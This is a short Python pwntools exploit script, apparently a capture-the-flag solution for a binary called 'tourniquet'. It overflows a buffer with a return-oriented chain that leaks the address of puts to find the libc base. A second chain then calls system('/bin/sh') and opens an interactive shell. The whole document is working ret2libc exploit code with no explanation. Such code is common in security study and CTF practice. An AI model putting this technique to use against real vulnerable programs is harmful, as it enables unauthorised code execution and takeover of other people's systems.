from pwn import *

elf = ELF('./tourniquet')
context.binary = elf

pop_rdi  = 0x004006d3
puts_plt = elf.plt.puts
puts_got = elf.got.puts
main_function = elf.functions.main_function.address
main = elf.functions.main.address
start = elf.functions._start.address
ret = 0x4004c6
csu = 0x400670

offset = 0x40

payload = p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start)
payload += b'\x00' * (offset - len(payload) - 1)

ld_preload = True

while True:
    if ld_preload:
        s = process('./tourniquet', env={'LD_PRELOAD' : './libc.so.6'})

    print(s.recvline())
    s.sendline(payload)
    try:
        # Get puts address
        data = s.recvline()[:-1]
        if b'\x7f' not in data:
            continue
        print(data)
        addr = int.from_bytes(data, 'little')
        print(hex(addr))

        libc = ELF('./libc.so.6')
        libc_base = addr - libc.symbols.puts
        libc.address = libc_base

        payload = p64(ret)
        payload += p64(ret)
        payload += p64(ret)
        payload += p64(ret)
        payload += p64(pop_rdi)
        payload += p64(next(libc.search(b'/bin/sh')))
        payload += p64(libc.symbols.system)
        payload += b'\x00' * (offset - len(payload) - 1)

        s.sendline(payload)
        s.interactive()
        break
    except EOFError:
        print('Error')
